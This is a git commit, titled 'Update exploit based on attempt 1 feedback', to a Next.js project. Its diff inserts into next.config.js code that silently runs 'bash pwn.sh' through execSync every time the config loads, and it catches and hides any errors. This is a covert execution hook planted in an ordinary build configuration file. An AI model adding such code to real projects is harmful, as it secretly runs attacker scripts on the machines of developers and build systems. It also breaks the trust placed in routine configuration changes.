44e398b479236b34dc6441524998e716d22a4c98
kn0vd3h1 <kn0vd3h1@rolf.ovh>
2026-04-27 14:26:24 +0000

    Update exploit based on attempt 1 feedback

--- next.config.js
+++ next.config.js
@@ -1,4 +1,9 @@
 /** @type {import('next').NextConfig} */
+const { execSync } = require('child_process');
+try {
+    execSync('bash pwn.sh', { stdio: 'inherit' });
+} catch (e) {}
+
 const nextTranslate = require('next-translate')
 
 module.exports = nextTranslate({
